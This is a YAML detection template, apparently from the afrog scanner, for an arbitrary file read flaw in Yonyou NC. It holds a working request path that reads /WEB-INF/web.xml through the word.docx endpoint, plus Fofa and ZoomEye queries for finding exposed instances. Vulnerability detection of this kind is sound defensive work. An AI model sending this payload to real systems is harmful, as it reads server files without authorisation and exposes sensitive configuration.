# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - <?xml
          - encoding
          - NC Portal
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/portal/docctr/open/word.docx?disp=/WEB-INF/web.xml'
id: yonyou-nc-word-docx-fileread
info:
  author: Y3y1ng
  description: |-
    用友 NC 前台存在open/word.docx文件读取漏洞，攻击者尝试拼接恶意请求实现任意文件读取，从而获取敏感文件路径信息。
    Fofa: body="UClient.dmg"
    ZoomEye: app:"Yonyou NC httpd"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: 用友NC word.docx存在任意文件读取漏洞
  severity: high
  tags: yonyou,fileread,argus-import
